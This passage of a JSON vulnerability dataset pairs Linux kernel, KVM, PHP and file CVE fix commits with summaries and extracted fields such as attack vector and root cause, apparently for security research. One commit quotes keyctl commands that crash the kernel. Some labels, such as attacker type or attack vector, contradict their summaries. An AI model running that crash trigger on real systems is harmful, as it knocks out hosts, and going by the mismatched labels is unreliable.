OS crash) via a crafted application.","commit_message_1":"x86 : handle error when rip is set during far jump far jmp\/call\/ret may fault while loading a new rip","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( guest os crash )","Root Cause":"does not properly perform rip changes","Attack Type":"local attacker"},{"commit_id":"a642fc305053cc1c6e47e4f4df327895747ab485","cve_id":"CVE-2014-3646","cwe_id":"CWE-264","commit_message":"kvm: vmx: handle invvpid vm exit gracefully\n\nOn systems with invvpid instruction support (corresponding bit in\nIA32_VMX_EPT_VPID_CAP MSR is set) guest invocation of invvpid\ncauses vm exit, which is currently not handled and results in\npropagation of unknown exit to userspace.\n\nFix this by installing an invvpid vm exit handler.\n\nThis is CVE-2014-3646.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/vmx.c in the KVM subsystem in the Linux kernel through 3.17.2 does not have an exit handler for the INVVPID instruction, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application.","commit_message_1":"vmx : handle invvpid vm exit gracefully on system with invvpid instruction support ( corresponding bit in ia32_vmx_ept_vpid_cap msr is set ) guest invocation of invvpid cause vm exit , which is currently not handled and result in propagation of unknown exit to userspace","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( guest os crash )","Root Cause":"does not have an exit handler for the invvpid instruction","Attack Type":"local attacker"},{"commit_id":"bfd0a56b90005f8c8a004baf407ad90045c2b11e","cve_id":"CVE-2014-3645","cwe_id":"CWE-20","commit_message":"nEPT: Nested INVEPT\n\nIf we let L1 use EPT, we should probably also support the INVEPT instruction.\n\nIn our current nested EPT implementation, when L1 changes its EPT table\nfor L2 (i.e., EPT12), L0 modifies the shadow EPT table (EPT02), and in\nthe course of this modification already calls INVEPT. But if last level\nof shadow page is unsync not all L1's changes to EPT12 are intercepted,\nwhich means roots need to be synced when L1 calls INVEPT. Global INVEPT\nshould not be different since roots are synced by kvm_mmu_load() each\ntime EPTP02 changes.\n\nReviewed-by: Xiao Guangrong <xiaoguangrong@linux.vnet.ibm.com>\nSigned-off-by: Nadav Har'El <nyh@il.ibm.com>\nSigned-off-by: Jun Nakajima <jun.nakajima@intel.com>\nSigned-off-by: Xinhao Xu <xinhao.xu@intel.com>\nSigned-off-by: Yang Zhang <yang.z.zhang@Intel.com>\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/vmx.c in the KVM subsystem in the Linux kernel before 3.12 does not have an exit handler for the INVEPT instruction, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application.","commit_message_1":"nested invept if we let l1 use ept , we should probably also support the invept instruction","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( guest os crash )","Root Cause":"does not have an exit handler for the invept instruction","Attack Type":"local attacker"},{"commit_id":"95389b08d93d5c06ec63ab49bd732b0069b7c35e","cve_id":"CVE-2014-3631","cwe_id":null,"commit_message":"KEYS: Fix termination condition in assoc array garbage collection\n\nThis fixes CVE-2014-3631.\n\nIt is possible for an associative array to end up with a shortcut node at the\nroot of the tree if there are more than fan-out leaves in the tree, but they\nall crowd into the same slot in the lowest level (ie. they all have the same\nfirst nibble of their index keys).\n\nWhen assoc_array_gc() returns back up the tree after scanning some leaves, it\ncan fall off of the root and crash because it assumes that the back pointer\nfrom a shortcut (after label ascend_old_tree) must point to a normal node -\nwhich isn't true of a shortcut node at the root.\n\nShould we find we're ascending rootwards over a shortcut, we should check to\nsee if the backpointer is zero - and if it is, we have completed the scan.\n\nThis particular bug cannot occur if the root node is not a shortcut - ie. if\nyou have fewer than 17 keys in a keyring or if you have at least two keys that\nsit into separate slots (eg. a keyring and a non keyring).\n\nThis can be reproduced by:\n\n\tring=`keyctl newring bar @s`\n\tfor ((i=1; i<=18; i++)); do last_key=`keyctl newring foo$i $ring`; done\n\tkeyctl timeout $last_key 2\n\nDoing this:\n\n\techo 3 >\/proc\/sys\/kernel\/keys\/gc_delay\n\nfirst will speed things up.\n\nIf we do fall off of the top of the tree, we get the following oops:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000018\nIP: [<ffffffff8136cea7>] assoc_array_gc+0x2f7\/0x540\nPGD dae15067 PUD cfc24067 PMD 0\nOops: 0000 [#1] SMP\nModules linked in: xt_nat xt_mark nf_conntrack_netbios_ns nf_conntrack_broadcast ip6t_rpfilter ip6t_REJECT xt_conntrack ebtable_nat ebtable_broute bridge stp llc ebtable_filter ebtables ip6table_ni\nCPU: 0 PID: 26011 Comm: kworker\/0:1 Not tainted 3.14.9-200.fc20.x86_64 #1\nHardware name: Bochs Bochs, BIOS Bochs 01\/01\/2011\nWorkqueue: events key_garbage_collector\ntask: ffff8800918bd580 ti: ffff8800aac14000 task.ti: ffff8800aac14000\nRIP: 0010:[<ffffffff8136cea7>] [<ffffffff8136cea7>] assoc_array_gc+0x2f7\/0x540\nRSP: 0018:ffff8800aac15d40  EFLAGS: 00010206\nRAX: 0000000000000000 RBX: 0000000000000000 RCX: ffff8800aaecacc0\nRDX: ffff8800daecf440 RSI: 0000000000000001 RDI: ffff8800aadc2bc0\nRBP: ffff8800aac15da8 R08: 0000000000000001 R09: 0000000000000003\nR10: ffffffff8136ccc7 R11: 0000000000000000 R12: 0000000000000000\nR13: 0000000000000000 R14: 0000000000000070 R15: 0000000000000001\nFS:  0000000000000000(0000) GS:ffff88011fc00000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\nCR2: 0000000000000018 CR3: 00000000db10d000 CR4: 00000000000006f0\nStack:\n ffff8800aac15d50 0000000000000011 ffff8800aac15db8 ffffffff812e2a70\n ffff880091a00600 0000000000000000 ffff8800aadc2bc3 00000000cd42c987\n ffff88003702df20 ffff88003702dfa0 0000000053b65c09 ffff8800aac15fd8\nCall Trace:\n [<ffffffff812e2a70>] ? keyring_detect_cycle_iterator+0x30\/0x30\n [<ffffffff812e3e75>] keyring_gc+0x75\/0x80\n [<ffffffff812e1424>] key_garbage_collector+0x154\/0x3c0\n [<ffffffff810a67b6>] process_one_work+0x176\/0x430\n [<ffffffff810a744b>] worker_thread+0x11b\/0x3a0\n [<ffffffff810a7330>] ? rescuer_thread+0x3b0\/0x3b0\n [<ffffffff810ae1a8>] kthread+0xd8\/0xf0\n [<ffffffff810ae0d0>] ? insert_kthread_work+0x40\/0x40\n [<ffffffff816ffb7c>] ret_from_fork+0x7c\/0xb0\n [<ffffffff810ae0d0>] ? insert_kthread_work+0x40\/0x40\nCode: 08 4c 8b 22 0f 84 bf 00 00 00 41 83 c7 01 49 83 e4 fc 41 83 ff 0f 4c 89 65 c0 0f 8f 5a fe ff ff 48 8b 45 c0 4d 63 cf 49 83 c1 02 <4e> 8b 34 c8 4d 85 f6 0f 84 be 00 00 00 41 f6 c6 01 0f 84 92\nRIP  [<ffffffff8136cea7>] assoc_array_gc+0x2f7\/0x540\n RSP <ffff8800aac15d40>\nCR2: 0000000000000018\n---[ end trace 1129028a088c0cbd ]---\n\nSigned-off-by: David Howells <dhowells@redhat.com>\nAcked-by: Don Zickus <dzickus@redhat.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The assoc_array_gc function in the associative-array implementation in lib\/assoc_array.c in the Linux kernel before 3.16.3 does not properly implement garbage collection, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via multiple *keyctl newring* operations followed by a *keyctl timeout* operation.","commit_message_1":"fix termination condition in assoc array garbage collection this fix <cve_id>","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via multiple * keyctl newring * operations followed by a * keyctl timeout * operation","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not properly implement garbage collection","Attack Type":"local attacker"},{"commit_id":"2febc839133280d5a5e8e1179c94ea674489dae2","cve_id":"CVE-2014-3611","cwe_id":"CWE-362","commit_message":"KVM: x86: Improve thread safety in pit\n\nThere's a race condition in the PIT emulation code in KVM.  In\n__kvm_migrate_pit_timer the pit_timer object is accessed without\nsynchronization.  If the race condition occurs at the wrong time this\ncan crash the host kernel.\n\nThis fixes CVE-2014-3611.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"Race condition in the __kvm_migrate_pit_timer function in arch\/x86\/kvm\/i8254.c in the KVM subsystem in the Linux kernel through 3.17.2 allows guest OS users to cause a denial of service (host OS crash) by leveraging incorrect PIT emulation.","commit_message_1":"x86 : improve thread safety in pit there 's a race condition in the pit emulation code in kvm","Vulnerability Type":"Race Condition","Attack Vector":"by leveraging incorrect pit emulation","Impact":"cause a denial of service ( host os crash )","Root Cause":"caused by a race condition","Attack Type":"remote attacker"},{"commit_id":"854e8bb1aa06c578c2c9145fa6bfe3680ef63b23","cve_id":"CVE-2014-3610","cwe_id":"CWE-264","commit_message":"KVM: x86: Check non-canonical addresses upon WRMSR\n\nUpon WRMSR, the CPU should inject #GP if a non-canonical value (address) is\nwritten to certain MSRs. The behavior is \"almost\" identical for AMD and Intel\n(ignoring MSRs that are not implemented in either architecture since they would\nanyhow #GP). However, IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if\nnon-canonical address is written on Intel but not on AMD (which ignores the top\n32-bits).\n\nAccordingly, this patch injects a #GP on the MSRs which behave identically on\nIntel and AMD.  To eliminate the differences between the architecutres, the\nvalue which is written to IA32_SYSENTER_ESP and IA32_SYSENTER_EIP is turned to\ncanonical value before writing instead of injecting a #GP.\n\nSome references from Intel and AMD manuals:\n\nAccording to Intel SDM description of WRMSR instruction #GP is expected on\nWRMSR \"If the source register contains a non-canonical address and ECX\nspecifies one of the following MSRs: IA32_DS_AREA, IA32_FS_BASE, IA32_GS_BASE,\nIA32_KERNEL_GS_BASE, IA32_LSTAR, IA32_SYSENTER_EIP, IA32_SYSENTER_ESP.\"\n\nAccording to AMD manual instruction manual:\nLSTAR\/CSTAR (SYSCALL): \"The WRMSR instruction loads the target RIP into the\nLSTAR and CSTAR registers.  If an RIP written by WRMSR is not in canonical\nform, a general-protection exception (#GP) occurs.\"\nIA32_GS_BASE and IA32_FS_BASE (WRFSBASE\/WRGSBASE): \"The address written to the\nbase field must be in canonical form or a #GP fault will occur.\"\nIA32_KERNEL_GS_BASE (SWAPGS): \"The address stored in the KernelGSbase MSR must\nbe in canonical form.\"\n\nThis patch fixes CVE-2014-3610.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The WRMSR processing functionality in the KVM subsystem in the Linux kernel through 3.17.2 does not properly handle the writing of a non-canonical address to a model-specific register, which allows guest OS users to cause a denial of service (host OS crash) by leveraging guest OS privileges, related to the wrmsr_interception function in arch\/x86\/kvm\/svm.c and the handle_wrmsr function in arch\/x86\/kvm\/vmx.c.","commit_message_1":"x86 : check non-canonical address upon wrmsr upon wrmsr , the cpu should inject # gp if a non-canonical value ( address ) is written to certain msrs","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging guest os privileges , related to the wrmsr _ interception function in arch \/ x86 \/ kvm \/ svm . c and the handle _ wrmsr function in arch \/ x86 \/ kvm \/ vmx . c","Impact":"cause a denial of service ( host os crash )","Root Cause":"does not properly handle the writing of a non - canonical address to a model - specific register ","Attack Type":"remote attacker"},{"commit_id":"350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7","cve_id":"CVE-2014-3601","cwe_id":"CWE-189","commit_message":"kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)\n\nThe third parameter of kvm_iommu_put_pages is wrong,\nIt should be 'gfn - slot->base_gfn'.\n\nBy making gfn very large, malicious guest or userspace can cause kvm to\ngo to this error path, and subsequently to pass a huge value as size.\nAlternatively if gfn is small, then pages would be pinned but never\nunpinned, causing host memory leak and local DOS.\n\nPassing a reasonable but large value could be the most dangerous case,\nbecause it would unpin a page that should have stayed pinned, and thus\nallow the device to DMA into arbitrary memory.  However, this cannot\nhappen because of the condition that can trigger the error:\n\n- out of memory (where you can't allocate even a single page)\n  should not be possible for the attacker to trigger\n\n- when exceeding the iommu's address space, guest pages after gfn\n  will also exceed the iommu's address space, and inside\n  kvm_iommu_put_pages() the iommu_iova_to_phys() will fail.  The\n  page thus would not be unpinned at all.\n\nReported-by: Jack Morgenstein <jackm@mellanox.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The kvm_iommu_map_pages function in virt\/kvm\/iommu.c in the Linux kernel through 3.16.1 miscalculates the number of pages during the handling of a mapping failure, which allows guest OS users to (1) cause a denial of service (host OS memory corruption) or possibly have unspecified other impact by triggering a large gfn value or (2) cause a denial of service (host OS memory consumption) by triggering a small gfn value that leads to permanently pinned pages.","commit_message_1":"iommu : fix the third parameter of kvm_iommu_put_pages ( <cve_id> ) the third parameter of kvm_iommu_put_pages is wrong , it should be 'gfn - slot- > base_gfn '","Vulnerability Type":"Numeric Errors","Attack Vector":"By triggering a large gfn value","Impact":"cause a denial of service ( host os memory corruption ) or possibly have unspecified other impact by triggering a large gfn value or cause a denial of service ( host os memory consumption","Root Cause":"miscalculates the number of pages during the handling of a mapping failure","Attack Type":"remote attacker"},{"commit_id":"2fefae47716d501aec41c1102f3fd4531f070b05","cve_id":"CVE-2014-3597","cwe_id":"CWE-119","commit_message":"Fixed Sec Bug #67717 segfault in dns_get_record CVE-2014-3597\n\nIncomplete fix for CVE-2014-4049\n\nCheck possible buffer overflow\n- pass real buffer end to dn_expand calls\n- check buffer len before each read","summary":"Multiple buffer overflows in the php_parserr function in ext\/standard\/dns.c in PHP before 5.4.32 and 5.5.x before 5.5.16 allow remote DNS servers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted DNS record, related to the dns_get_record function and the dn_expand function.  NOTE: this issue exists because of an incomplete fix for CVE-2014-4049.","commit_message_1":"fixed sec bug # <number> segfault in dns_get_record <cve_id>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted dns record , related to the dns _ get _ record function and the dn _ expand function","Impact":"cause a denial of service ( application crash ) or possibly execute arbitrary code","Root Cause":"caused by an incomplete fix related to improper bounds checking when parsing DNS TXT record","Attack Type":"remote attacker"},{"commit_id":"7ba1409a1aee5925180de546057ddd84ff267947","cve_id":"CVE-2014-3587","cwe_id":"CWE-189","commit_message":"Fix bug #67716 - Segfault in cdf.c","summary":"Integer overflow in the cdf_read_property_info function in cdf.c in file through 5.19, as used in the Fileinfo component in PHP before 5.4.32 and 5.5.x before 5.5.16, allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-1571.","commit_message_1":"fix bug # <number> - segfault in <file>","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted cdf file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an incomplete fix related to the cdf_read_property_info() function","Attack Type":"remote attacker"},{"commit_id":"4a284c89d6ef11aca34da65da7d673050a5ea320","cve_id":"CVE-2014-3538","cwe_id":"CWE-399","commit_message":"* Enforce limit of 8K on regex searches that have no limits\n* Allow the l modifier for regex to mean line count. Default\n  to byte count. If line count is specified, assume a max\n  of 80 characters per line to limit the byte count.\n* Don't allow conversions to be used for dates, allowing\n  the mask field to be used as an offset.\n* Bump the version of the magic format so that regex changes\n  are visible.","summary":"file before 5.19 does not properly restrict the amount of data read during a regex search, which allows remote attackers to cause a denial of service (CPU consumption) via a crafted file that triggers backtracking during processing of an awk rule.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7345.","commit_message_1":"* enforce limit of 8k on regex search that have no limit * allow the l modifier for regex to mean line count","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted file that triggers backtracking during processing of an awk rule","Impact":"cause a denial of service ( cpu consumption )","Root Cause":"does not properly restrict the amount of data read during a regex search","Attack Type":"remote attacker"},{"commit_id":"256df2f3879efdb2e9808bdb1b54b16fbb11fa38","cve_id":"CVE-2014-3535","cwe_id":"CWE-119","commit_message":"netdevice.h net\/core\/dev.c: Convert netdev_<level> logging macros to functions\n\nReduces an x86 defconfig text and data ~2k.\ntext is smaller, data is larger.\n\n$ size vmlinux*\n   text\t   data\t    bss\t    dec\t    hex\tfilename\n7198862\t 720112\t1366288\t9285262\t 8dae8e\tvmlinux\n7205273\t 716016\t1366288\t9287577\t 8db799\tvmlinux.device_h\n\nUses %pV and struct va_format\nFormat arguments are verified before printk\n\nSigned-off-by: Joe Perches <joe@perches.com>\nAcked-by: Greg Kroah-Hartman <gregkh@suse.de>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"include\/linux\/netdevice.h in the Linux kernel before 2.6.36 incorrectly uses macros for netdev_printk and its related logging implementation, which allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) by sending invalid packets to a VxLAN interface.","commit_message_1":"convert netdev_ < level > logging macro to function reduces an x86 defconfig text and data ~2k","Vulnerability Type":"buffer overflow","Attack Vector":"by sending invalid packets to a vxlan interface","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"uses macros for netdev _ printk and its related logging implementation","Attack Type":"remote attacker"},{"commit_id":"dab6cf55f81a6e16b8147aed9a843e1691dcd318","cve_id":"CVE-2014-3534","cwe_id":"CWE-264","commit_message":"s390\/ptrace: fix PSW mask check\n\nThe PSW mask check of the PTRACE_POKEUSR_AREA command is incorrect.\nThe PSW_MASK_USER define contains the PSW_MASK_ASC bits, the ptrace\ninterface accepts all combinations for the address-space-control\nbits. To protect the kernel space the PSW mask check in ptrace needs\nto reject the address-space-control bit combination for home space.\n\nFixes CVE-2014-3534\n\nCc: stable@vger.kernel.org\nSigned-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>","summary":"arch\/s390\/kernel\/ptrace.c in the Linux kernel before 3.15.8 on the s390 platform does not properly restrict address-space control operations in PTRACE_POKEUSR_AREA requests, which allows local users to obtain read and write access to kernel memory locations, and consequently gain privileges, via a crafted application that makes a ptrace system call.","commit_message_1":"fix psw mask check the psw mask check of the ptrace_pokeusr_area command is incorrect","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application that makes a ptrace system call","Impact":"obtain read and write access to kernel memory locations , and consequently gain privileges","Root Cause":"does not properly restrict address - space control operations","Attack Type":"local attacker"},{"commit_id":"93e063ee374b6a75729df9e7201fb511e47e259d","cve_id":"CVE-2014-3487","cwe_id":"CWE-20","commit_message":"Add missing check offset test (Francisco Alonso, Jan Kaluza at RedHat)","summary":"The cdf_read_property_info function in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, does not properly validate a stream offset, which allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.","commit_message_1":"add missing check offset test ( francisco alonso , jan kaluza at redhat )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted cdf file","Impact":"cause a denial of service ( application crash )","Root Cause":"does not properly validate a stream offset ","Attack Type":"remote attacker"},{"commit_id":"40bade80cbe2af1d0b2cd0420cebd5d5905a2382","cve_id":"CVE-2014-3480","cwe_id":"CWE-20","commit_message":"Fix incorrect bounds check for sector count. (Francisco Alonso and Jan Kaluza\nat RedHat)","summary":"The cdf_count_chain function in cdf.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, does not properly validate sector-count data, which allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.","commit_message_1":"fix incorrect bound check for sector count","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted cdf file","Impact":"cause a denial of service ( application crash )","Root Cause":"does not properly validate sector - count data","Attack Type":"remote attacker"},{"commit_id":"36fadd29849b8087af9f4586f89dbf74ea45be67","cve_id":"CVE-2014-3479","cwe_id":"CWE-189","commit_message":"Use the proper sector size when checking stream offsets (Francisco Alonso and\nJan Kaluza at RedHat)","summary":"The cdf_check_stream_offset function in cdf.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, relies on incorrect sector-size data, which allows remote attackers to cause a denial of service (application crash) via a crafted stream offset in a CDF file.","commit_message_1":"use the proper sector size when checking stream offset ( francisco alonso and","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted stream offset in a cdf file","Impact":"cause a denial of service ( application crash )","Root Cause":"relies on incorrect sector - size data","Attack Type":"remote attacker"},{"commit_id":"27a14bc7ba285a0a5ebfdb55e54001aa11932b08","cve_id":"CVE-2014-3478","cwe_id":"CWE-119","commit_message":"Correctly compute the truncated pascal string size (Francisco Alonso and\nJan Kaluza at RedHat)","summary":"Buffer overflow in the mconvert function in softmagic.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, allows remote attackers to cause a denial of service (application crash) via a crafted Pascal string in a FILE_PSTRING conversion.","commit_message_1":"correctly compute the truncated pascal string size ( francisco alonso and","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted pascal string in a file _ pstring conversion","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"844817e47eef14141cf59b8d5ac08dd11c0a9189","cve_id":"CVE-2014-3186","cwe_id":"CWE-119","commit_message":"HID: picolcd: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be\narbitrarily large, therefore we better sanity-check it so that raw_data\nthat we hold in picolcd_pending structure are always kept within proper\nbounds.\n\nCc: stable@vger.kernel.org\nReported-by: Steven Vittitoe <scvitti@google.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"Buffer overflow in the picolcd_raw_event function in devices\/hid\/hid-picolcd_core.c in the PicoLCD HID device driver in the Linux kernel through 3.16.3, as used in Android on Nexus 7 devices, allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that sends a large report.","commit_message_1":"picolcd : sanity check report size in raw_event ( ) callback the report passed to u from transport driver could potentially be arbitrarily large , therefore we better sanity-check it so that raw_data that we hold in picolcd_pending structure are always kept within proper bound","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted device that sends a large report","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the PicoLCD HID device driver","Attack Type":"local attacker"},{"commit_id":"6817ae225cd650fb1c3295d769298c38b1eba818","cve_id":"CVE-2014-3185","cwe_id":"CWE-119","commit_message":"USB: whiteheat: Added bounds checking for bulk command response\n\nThis patch fixes a potential security issue in the whiteheat USB driver\nwhich might allow a local attacker to cause kernel memory corrpution. This\nis due to an unchecked memcpy into a fixed size buffer (of 64 bytes). On\nEHCI and XHCI busses it's possible to craft responses greater than 64\nbytes leading a buffer overflow.\n\nSigned-off-by: James Forshaw <forshaw@google.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Multiple buffer overflows in the command_port_read_callback function in drivers\/usb\/serial\/whiteheat.c in the Whiteheat USB Serial Driver in the Linux kernel before 3.16.2 allow physically proximate attackers to execute arbitrary code or cause a denial of service (memory corruption and system crash) via a crafted device that provides a large amount of (1) EHCI or (2) XHCI data associated with a bulk response.","commit_message_1":"whiteheat : added bound checking for bulk command response this patch fix a potential security issue in the whiteheat usb driver which might allow a local attacker to cause kernel memory corrpution","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted device that provides a large amount of ( 1 ) ehci or ( 2 ) xhci data associated with a bulk response","Impact":"execute arbitrary code or cause a denial of service ( memory corruption and system crash","Root Cause":"caused by improper bounds checking by the command_port_read_callback function within the whiteheat USB driver","Attack Type":"local attacker"},{"commit_id":"4ab25786c87eb20857bbb715c3ae34ec8fd6a214","cve_id":"CVE-2014-3184","cwe_id":"CWE-119","commit_message":"HID: fix a couple of off-by-ones\n\nThere are a few very theoretical off-by-one bugs in report descriptor size\nchecking when performing a pre-parsing fixup. Fix those.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers\/hid\/hid-cherry.c, (2) drivers\/hid\/hid-kye.c, (3) drivers\/hid\/hid-lg.c, (4) drivers\/hid\/hid-monterey.c, (5) drivers\/hid\/hid-petalynx.c, and (6) drivers\/hid\/hid-sunplus.c.","commit_message_1":"fix a couple of off-by-ones there are a few very theoretical off-by-one bug in report descriptor size checking when performing a pre-parsing fixup","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted device that provides a small report descriptor , related to ( 1 ) drivers \/ hid \/ hid - cherry . c , ( 2 ) drivers \/ hid \/ hid - kye . c , ( 3 ) drivers \/ hid \/ hid - lg . c , ( 4 ) drivers \/ hid \/ hid - monterey . c , ( 5 ) drivers \/ hid \/ hid - petalynx . c","Impact":"cause a denial of service ( out - of - bounds write )","Root Cause":"caused by multiple off-by-one errors","Attack Type":"local attacker"},{"commit_id":"51217e69697fba92a06e07e16f55c9a52d8e8945","cve_id":"CVE-2014-3183","cwe_id":"CWE-119","commit_message":"HID: logitech: fix bounds checking on LED report size\n\nThe check on report size for REPORT_TYPE_LEDS in logi_dj_ll_raw_request()\nis wrong; the current check doesn't make any sense -- the report allocated\nby HID core in hid_hw_raw_request() can be much larger than\nDJREPORT_SHORT_LENGTH, and currently logi_dj_ll_raw_request() doesn't\nhandle this properly at all.\n\nFix the check by actually trimming down the report size properly if it is\ntoo large.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"Heap-based buffer overflow in the logi_dj_ll_raw_request function in drivers\/hid\/hid-logitech-dj.c in the Linux kernel before 3.16.2 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that specifies a large report size for an LED report.","commit_message_1":"logitech : fix bound checking on led report size the check on report size for report_type_leds in logi_dj_ll_raw_request ( ) is wrong ; the current check doe n't make any sense -- the report allocated by hid core in hid_hw_raw_request ( ) can be much larger than djreport_short_length , and currently logi_dj_ll_raw_request ( ) doe n't handle this properly at all","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted device that specifies a large report size for an led report","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the logi_dj_ll_raw_request() function","Attack Type":"local attacker"},{"commit_id":"ad3e14d7c5268c2e24477c6ef54bbdf88add5d36","cve_id":"CVE-2014-3182","cwe_id":"CWE-119","commit_message":"HID: logitech: perform bounds checking on device_id early enough\n\ndevice_index is a char type and the size of paired_dj_deivces is 7\nelements, therefore proper bounds checking has to be applied to\ndevice_index before it is used.\n\nWe are currently performing the bounds checking in\nlogi_dj_recv_add_djhid_device(), which is too late, as malicious device\ncould send REPORT_TYPE_NOTIF_DEVICE_UNPAIRED early enough and trigger the\nproblem in one of the report forwarding functions called from\nlogi_dj_raw_event().\n\nFix this by performing the check at the earliest possible ocasion in\nlogi_dj_raw_event().\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"Array index error in the logi_dj_raw_event function in drivers\/hid\/hid-logitech-dj.c in the Linux kernel before 3.16.2 allows physically proximate attackers to execute arbitrary code or cause a denial of service (invalid kfree) via a crafted device that provides a malformed REPORT_TYPE_NOTIF_DEVICE_UNPAIRED value.","commit_message_1":"logitech : perform bound checking on device_id early enough device_index is a char type and the size of paired_dj_deivces is <number> element , therefore proper bound checking ha to be applied to device_index before it is used","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted device that provides a malformed report _ type _ notif _ device _ unpaired value","Impact":"execute arbitrary code or cause a denial of service ( invalid kfree )","Root Cause":"caused by improper bounds checking by the logi_dj_recv_destroy_djhid_device function","Attack Type":"local attacker"},{"commit_id":"c54def7bd64d7c0b6993336abcffb8444795bf38","cve_id":"CVE-2014-3181","cwe_id":"CWE-119","commit_message":"HID: magicmouse: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be\narbitrarily large, therefore we better sanity-check it so that\nmagicmouse_emit_touch() gets only valid values of raw_id.\n\nCc: stable@vger.kernel.org\nReported-by: Steven Vittitoe <scvitti@google.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"Multiple stack-based buffer overflows in the magicmouse_raw_event function in drivers\/hid\/hid-magicmouse.c in the Magic Mouse HID driver in the Linux kernel through 3.16.3 allow physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that provides a large amount of (1) EHCI or (2) XHCI data associated with an event.","commit_message_1":"magicmouse : sanity check report size in raw_event ( ) callback the report passed to u from transport driver could potentially be arbitrarily large , therefore we better sanity-check it so that magicmouse_emit_touch ( ) get only valid value of raw_id","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long string","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the magicmouse_raw_event function within the Magic Mouse HID driver","Attack Type":"local 